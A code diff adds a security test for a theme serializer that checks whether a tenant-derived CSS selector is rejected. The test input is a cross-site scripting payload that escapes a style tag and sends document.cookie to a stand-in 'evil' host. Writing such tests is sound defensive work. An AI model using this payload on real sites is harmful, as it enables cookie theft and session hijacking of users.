@@ -184,3 +184,13 @@ test('serializeThemePatch — опциональный selector проходит
     'UNSAFE_CSS_TOKEN',
   )
 })
+
+test('serializeThemePatch — tenant-derived selector <>-breakout (adversarial-verify P6.1, H3) throws UNSAFE_CSS_TOKEN', () => {
+  const base = fullBase()
+  const tenantId = 'x"]</style><script>fetch(\'//evil?\'+document.cookie)</script><style>[y="'
+  expect(
+    code(() =>
+      serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: `[data-tenant="${tenantId}"]` }),
+    ),
+  ).toBe('UNSAFE_CSS_TOKEN')
+})
